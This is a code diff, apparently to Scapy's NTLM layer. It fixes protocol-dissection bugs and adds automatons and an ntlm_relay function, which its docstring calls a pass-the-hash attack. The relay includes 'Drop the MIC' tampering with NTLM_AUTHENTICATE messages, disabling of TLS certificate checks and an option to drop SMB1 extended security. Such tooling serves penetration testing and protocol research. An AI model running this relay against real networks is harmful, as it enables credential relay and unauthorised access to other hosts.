@@ -9,13 +9,28 @@ NTLM
 https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-NLMP/%5bMS-NLMP%5d.pdf
 """
 
+import ssl
+import socket
 import struct
+import threading
+
+from scapy.arch import get_if_addr
+from scapy.asn1.asn1 import ASN1_STRING, ASN1_Codecs
+from scapy.asn1.mib import conf  # loads conf.mib
+from scapy.asn1fields import (
+    ASN1F_OID,
+    ASN1F_PRINTABLE_STRING,
+    ASN1F_SEQUENCE,
+    ASN1F_SEQUENCE_OF
+)
+from scapy.asn1packet import ASN1_Packet
+from scapy.automaton import Automaton, ObjectPipe
 from scapy.compat import bytes_base64
-from scapy.config import conf
 from scapy.fields import (
     Field,
     ByteEnumField,
     ByteField,
+    ConditionalField,
     FieldLenField,
     FlagsField,
     LEIntField,
@@ -38,9 +53,11 @@ from scapy.fields import (
 )
 from scapy.packet import Packet
 from scapy.sessions import StringBuffer
+from scapy.supersocket import SSLStreamSocket, StreamSocket
 
 from scapy.compat import (
     Any,
+    Callable,
     Dict,
     List,
     Tuple,
@@ -55,17 +72,24 @@ from scapy.compat import (
 class _NTLMPayloadField(_StrField[List[Tuple[str, Any]]]):
     """Special field used to dissect NTLM payloads.
     This isn't trivial because the offsets are variable."""
-    __slots__ = ["fields", "fields_map", "offset"]
+    __slots__ = ["fields", "fields_map", "offset", "length_from"]
     islist = True
 
-    def __init__(self, name, offset, fields):
-        # type: (str, int, List[Field[Any, Any]]) -> None
+    def __init__(self,
+                 name,  # type: str
+                 offset,  # type: int
+                 fields,  # type: List[Field[Any, Any]]
+                 length_from=None  # type: Optional[Callable[[Packet], int]]
+                 ):
+        # type: (...) -> None
         self.offset = offset
         self.fields = fields
         self.fields_map = {field.name: field for field in fields}
+        self.length_from = length_from
         super(_NTLMPayloadField, self).__init__(
             name,
-            [(field.name, field.default) for field in fields]
+            [(field.name, field.default) for field in fields
+             if field.default is not None]
         )
 
     def m2i(self, pkt, x):
@@ -74,8 +98,11 @@ class _NTLMPayloadField(_StrField[List[Tuple[str, Any]]]):
             return []
         results = []
         for field in self.fields:
-            length = pkt.getfieldval(field.name + "Len")
             offset = pkt.getfieldval(field.name + "BufferOffset") - self.offset
+            try:
+                length = pkt.getfieldval(field.name + "Len")
+            except AttributeError:
+                length = len(x) - offset
             if offset < 0:
                 continue
             if x[offset:offset + length]:
@@ -91,43 +118,70 @@ class _NTLMPayloadField(_StrField[List[Tuple[str, Any]]]):
             if field_name not in self.fields_map:
                 continue
             field = self.fields_map[field_name]
-            offset = (-self.offset + pkt.getfieldval(
-                field_name + "BufferOffset")) or len(buf)
+            offset = pkt.getfieldval(field_name + "BufferOffset")
+            if offset is not None:
+                offset -= self.offset
+            else:
+                offset = len(buf)
             buf.append(field.addfield(pkt, b"", value), offset + 1)
         return bytes(buf)
 
-    def i2h(self, pkt, x):
-        # type: (Optional[Packet], bytes) -> List[Tuple[str, str]]
+    def _on_payload(self, pkt, x, func):
+        # type: (Optional[Packet], bytes, str) -> List[Tuple[str, Any]]
         if not pkt or not x:
             return []
         results = []
         for field_name, value in x:
             if field_name not in self.fields_map:
                 continue
-            results.append(
-                (field_name, self.fields_map[field_name].i2h(pkt, value)))
+            if not isinstance(self.fields_map[field_name], PacketListField) \
+                    and not isinstance(value, Packet):
+                value = getattr(self.fields_map[field_name], func)(pkt, value)
+            results.append((
+                field_name,
+                value
+            ))
         return results
 
+    def i2h(self, pkt, x):
+        # type: (Optional[Packet], bytes) -> List[Tuple[str, str]]
+        return self._on_payload(pkt, x, "i2h")
 
-def _NTML_post_build(self, p, pay_offset, fields):
+    def h2i(self, pkt, x):
+        # type: (Optional[Packet], bytes) -> List[Tuple[str, str]]
+        return self._on_payload(pkt, x, "h2i")
+
+    def i2repr(self, pkt, x):
+        # type: (Optional[Packet], bytes) -> str
+        return repr(self._on_payload(pkt, x, "i2repr"))
+
+    def getfield(self, pkt, s):
+        # type: (Packet, bytes) -> Tuple[bytes, bytes]
+        if self.length_from is None:
+            return b"", self.m2i(pkt, s)
+        len_pkt = self.length_from(pkt)
+        return s[len_pkt:], self.m2i(pkt, s[:len_pkt])
+
+
+def _NTLM_post_build(self, p, pay_offset, fields):
     # type: (Packet, bytes, int, Dict[str, Tuple[str, int]]) -> bytes
     """Util function to build the offset and populate the lengths"""
-    for field_name, value in self.Payload:
+    for field_name, value in self.fields["Payload"]:
         length = self.get_field(
             "Payload").fields_map[field_name].i2len(self, value)
         offset = fields[field_name]
         # Length
         if self.getfieldval(field_name + "Len") is None:
             p = p[:offset] + \
-                struct.pack("!H", length) + p[offset + 2:]
+                struct.pack("<H", length) + p[offset + 2:]
         # MaxLength
         if self.getfieldval(field_name + "MaxLen") is None:
             p = p[:offset + 2] + \
-                struct.pack("!H", length) + p[offset + 4:]
+                struct.pack("<H", length) + p[offset + 4:]
         # Offset
         if self.getfieldval(field_name + "BufferOffset") is None:
             p = p[:offset + 4] + \
-                struct.pack("!I", pay_offset) + p[offset + 8:]
+                struct.pack("<I", pay_offset) + p[offset + 8:]
         pay_offset += length
     return p
 
@@ -250,7 +304,7 @@ class NTLM_NEGOTIATE(Packet):
 
     def post_build(self, pkt, pay):
         # type: (bytes, bytes) -> bytes
-        return _NTML_post_build(self, pkt, self.OFFSET, {
+        return _NTLM_post_build(self, pkt, self.OFFSET, {
             "DomainName": 16,
             "WorkstationName": 24,
         }) + pay
@@ -311,7 +365,7 @@ class AV_PAIR(Packet):
 
 
 class NTLM_CHALLENGE(Packet):
-    name = "NTLM Negotiate"
+    name = "NTLM Challenge"
     messageType = 2
     OFFSET = 56
     fields_desc = [
@@ -340,7 +394,7 @@ class NTLM_CHALLENGE(Packet):
 
     def post_build(self, pkt, pay):
         # type: (bytes, bytes) -> bytes
-        return _NTML_post_build(self, pkt, self.OFFSET, {
+        return _NTLM_post_build(self, pkt, self.OFFSET, {
             "TargetName": 12,
             "TargetInfo": 40,
         }) + pay
@@ -424,7 +478,10 @@ class NTLM_AUTHENTICATE(Packet):
         # VERSION
         _NTLM_Version,
         # MIC
-        XStrFixedLenField('MIC', b"", length=16),
+        ConditionalField(
+            XStrFixedLenField('MIC', b"", length=16),
+            lambda pkt: pkt.fields.get('MIC', b"") is not None
+        ),
         # Payload
         _NTLMPayloadField(
             'Payload', OFFSET, [
@@ -449,7 +506,7 @@ class NTLM_AUTHENTICATE(Packet):
 
     def post_build(self, pkt, pay):
         # type: (bytes, bytes) -> bytes
-        return _NTML_post_build(self, pkt, self.OFFSET, {
+        return _NTLM_post_build(self, pkt, self.OFFSET, {
             "LmChallengeResponse": 12,
             "NtChallengeResponse": 20,
             "DomainName": 28,
@@ -469,4 +526,288 @@ def HTTP_ntlm_negotiate(ntlm_negotiate):
     from scapy.layers.http import HTTP, HTTPRequest
     return HTTP() / HTTPRequest(
         Authorization=b"NTLM " + bytes_base64(bytes(ntlm_negotiate))
+    )
+
+# Answering machine
+
+
+class _NTLM_Automaton(Automaton):
+    def __init__(self, sock, **kwargs):
+        # type: (StreamSocket, Any) -> None
+        self.token_pipe = ObjectPipe()
+        self.values = {}
+        for key, dflt in [("DROP_MIC_v1", False), ("DROP_MIC_v2", False)]:
+            setattr(self, key, kwargs.pop(key, dflt))
+        self.DROP_MIC = self.DROP_MIC_v1 or self.DROP_MIC_v2
+        super(_NTLM_Automaton, self).__init__(
+            recvsock=lambda **kwargs: sock,
+            ll=lambda **kwargs: sock,
+            **kwargs
+        )
+
+    def _get_token(self, token):
+        from scapy.layers.gssapi import (
+            GSSAPI_BLOB,
+            SPNEGO_negToken,
+            SPNEGO_Token
+        )
+
+        negResult = None
+        MIC = None
+        if not token:
+            return None, negResult, MIC
+
+        if isinstance(token, bytes):
+            ntlm = NTLM_Header(token)
+        elif isinstance(token, conf.raw_layer):
+            ntlm = NTLM_Header(token.load)
+        else:
+            if isinstance(token, GSSAPI_BLOB):
+                token = token.innerContextToken
+            if isinstance(token, SPNEGO_negToken):
+                token = token.token
+            if hasattr(token, "mechListMIC") and token.mechListMIC:
+                MIC = token.mechListMIC.value
+            if hasattr(token, "negResult"):
+                negResult = token.negResult
+            try:
+                ntlm = token.mechToken
+            except AttributeError:
+                ntlm = token.responseToken
+            if isinstance(ntlm, SPNEGO_Token):
+                ntlm = ntlm.value
+            if isinstance(ntlm, ASN1_STRING):
+                ntlm = NTLM_Header(ntlm.val)
+            if isinstance(ntlm, conf.raw_layer):
+                ntlm = NTLM_Header(ntlm.load)
+        if self.DROP_MIC_v1 or self.DROP_MIC_v2:
+            if isinstance(ntlm, NTLM_AUTHENTICATE):
+                ntlm.MIC = b"\0" * 16
+                ntlm.NtChallengeResponseLen = None
+                ntlm.NtChallengeResponseMaxLen = None
+                ntlm.EncryptedRandomSessionKeyBufferOffset = None
+                if self.DROP_MIC_v2:
+                    ChallengeResponse = next(
+                        v[1] for v in ntlm.Payload
+                        if v[0] == 'NtChallengeResponse'
+                    )
+                    i = next(
+                        i for i, k in enumerate(ChallengeResponse.AvPairs)
+                        if k.AvId == 0x0006
+                    )
+                    ChallengeResponse.AvPairs.insert(
+                        i + 1,
+                        AV_PAIR(AvId="MsvAvFlags", Value=0)
+                    )
+        return ntlm, negResult, MIC
+
+    def received_ntlm_token(self, ntlm):
+        self.token_pipe.send(ntlm)
+
+    def get(self, attr, default=None):
+        if default is not None:
+            return self.values.get(attr, default)
+        return self.values[attr]
+
+    def end(self):
+        self.listen_sock.close()
+        self.stop()
+
+
+class NTLM_Client(_NTLM_Automaton):
+    """
+    A class to overload to create a client automaton when using the
+    NTLM relay.
+    """
+    port = 445
+    cls = conf.raw_layer
+    ssl = False
+    kwargs_cls = {}
+
+    def __init__(self, *args, **kwargs):
+        self.client_pipe = ObjectPipe()
+        super(NTLM_Client, self).__init__(*args, **kwargs)
+
+    def bind(self, srv_atmt):
+        # type: (NTLM_Server) -> None
+        self.srv_atmt = srv_atmt
+
+    def set_srv(self, attr, value):
+        self.srv_atmt.values[attr] = value
+
+    def get_token(self):
+        return self.srv_atmt.token_pipe.recv()
+
+    def echo(self, pkt):
+        return self.srv_atmt.send(pkt)
+
+    def wait_server(self):
+        kwargs = self.client_pipe.recv()
+        self.client_pipe.close()
+        return kwargs
+
+
+class NTLM_Server(_NTLM_Automaton):
+    """
+    A class to overload to create a server automaton when using the
+    NTLM relay.
+    """
+    port = 445
+    cls = conf.raw_layer
+
+    def bind(self, cli_atmt):
+        # type: (NTLM_Client) -> None
+        self.cli_atmt = cli_atmt
+
+    def get_token(self):
+        return self.cli_atmt.token_pipe.recv()
+
+    def set_cli(self, attr, value):
+        self.cli_atmt.values[attr] = value
+
+    def echo(self, pkt):
+        return self.cli_atmt.send(pkt)
+
+    def start_client(self, **kwargs):
+        self.cli_atmt.client_pipe.send(kwargs)
+
+
+def ntlm_relay(serverCls,
+               remoteIP,
+               remoteClientCls,
+               # Classic attacks
+               DROP_MIC_v1=False,
+               DROP_MIC_v2=False,
+               DROP_EXTENDED_SECURITY=False,  # SMB1
+               # Optional arguments
+               ALLOW_SMB2=None,
+               server_kwargs=None,
+               client_kwargs=None,
+               iface=None):
+    """
+    NTLM Relay
+
+    This class aims at implementing a simple pass-the-hash attack across
+    various protocols.
+
+    Usage example:
+        ntlm_relay(port=445,
+                   remoteIP="192.168.122.65",
+                   remotePort=445,
+                   iface="eth0")
+
+    :param port: the port to open the relay on
+    :param remoteIP: the address IP of the server to connect to for auth
+    :param remotePort: the proto to connect to the server into
+    """
+
+    assert issubclass(
+        serverCls, NTLM_Server), "Specify a correct NTLM server class"
+    assert issubclass(
+        remoteClientCls, NTLM_Client), "Specify a correct NTLM client class"
+    assert remoteIP, "Specify a valid remote IP address"
+
+    ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ssock.bind(
+        (get_if_addr(iface or conf.iface), serverCls.port))
+    ssock.listen(5)
+    sniffers = []
+    server_kwargs = server_kwargs or {}
+    client_kwargs = client_kwargs or {}
+    if DROP_MIC_v1:
+        server_kwargs["DROP_MIC_v1"] = client_kwargs["DROP_MIC_v1"] = True
+    if DROP_MIC_v2:
+        server_kwargs["DROP_MIC_v2"] = client_kwargs["DROP_MIC_v2"] = True
+    if DROP_EXTENDED_SECURITY:
+        client_kwargs["EXTENDED_SECURITY"] = False
+        server_kwargs["EXTENDED_SECURITY"] = False
+    if ALLOW_SMB2 is not None:
+        client_kwargs["ALLOW_SMB2"] = server_kwargs["ALLOW_SMB2"] = ALLOW_SMB2
+    for k, v in remoteClientCls.kwargs_cls.get(serverCls, {}).items():
+        if k not in server_kwargs:
+            server_kwargs[k] = v
+    try:
+        evt = threading.Event()
+        while not evt.is_set():
+            clientsocket, address = ssock.accept()
+            sock = StreamSocket(clientsocket, serverCls.cls)
+            srv_atmt = serverCls(sock, debug=4, **server_kwargs)
+            # Connect to real server
+            _sock = socket.socket()
+            _sock.connect(
+                (remoteIP, remoteClientCls.port)
+            )
+            remote_sock = None
+            # SSL?
+            if remoteClientCls.ssl:
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                # Disable all SSL checks...
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                _sock = context.wrap_socket(_sock)
+                remote_sock = SSLStreamSocket(_sock, remoteClientCls.cls)
+            else:
+                remote_sock = StreamSocket(_sock, remoteClientCls.cls)
+            print("%s connected -> %s" %
+                  (repr(address), repr(_sock.getsockname())))
+            cli_atmt = remoteClientCls(remote_sock, debug=4, **client_kwargs)
+            sock_tup = ((srv_atmt, cli_atmt), (sock, remote_sock))
+            sniffers.append(sock_tup)
+            # Bind NTLM functions
+            srv_atmt.bind(cli_atmt)
+            cli_atmt.bind(srv_atmt)
+            # Start automatons
+            srv_atmt.runbg()
+            cli_atmt.runbg()
+    except KeyboardInterrupt:
+        print("Exiting.")
+    finally:
+        for atmts, socks in sniffers:
+            for atmt in atmts:
+                try:
+                    atmt.forcestop(wait=False)
+                except Exception:
+                    pass
+            for sock in socks:
+                try:
+                    sock.close()
+                except Exception:
+                    pass
+        ssock.close()
+
+
+# Experimental - Reversed stuff
+
+# This is the GSSAPI NegoEX Exchange metadata blob. This is not documented
+# but described as an "opaque blob": this was reversed and everything is a
+# placeholder.
+
+class NEGOEX_EXCHANGE_NTLM_ITEM(ASN1_Packet):
+    ASN1_codec = ASN1_Codecs.BER
+    ASN1_root = ASN1F_SEQUENCE(
+        ASN1F_SEQUENCE(
+            ASN1F_SEQUENCE(
+                ASN1F_OID("oid", ""),
+                ASN1F_PRINTABLE_STRING("token", ""),
+                explicit_tag=0x31
+            ),
+            explicit_tag=0x80
+        )
+    )
+
+
+class NEGOEX_EXCHANGE_NTLM(ASN1_Packet):
+    """
+    GSSAPI NegoEX Exchange metadata blob
+    This was reversed and may be meaningless
+    """
+    ASN1_codec = ASN1_Codecs.BER
+    ASN1_root = ASN1F_SEQUENCE(
+        ASN1F_SEQUENCE(
+            ASN1F_SEQUENCE_OF(
+                "items", [],
+                NEGOEX_EXCHANGE_NTLM_ITEM
+            ),
+            implicit_tag=0xa0
+        ),
     )
